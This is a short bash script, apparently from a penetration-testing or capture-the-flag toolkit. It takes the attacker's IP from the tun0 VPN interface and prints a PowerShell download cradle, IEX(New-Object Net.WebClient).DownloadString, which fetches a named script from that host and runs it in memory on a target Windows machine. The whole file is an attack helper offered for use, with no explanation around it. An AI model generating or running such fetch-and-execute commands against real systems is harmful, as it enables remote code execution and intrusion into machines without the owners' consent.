#!/bin/bash

if [ "$#" -ne 1 ]; then
    printf '%s <downloadfile>\n' "$0" 1>&2
    exit 1
fi

ip="$(ip a s tun0 | grep -oP '(\d{1,3}\.){3}\d{1,3}')"
printf 'IEX(New-Object Net.WebClient).DownloadString('"'"'http://%s/%s'"'"')\n' "$ip" "$1"
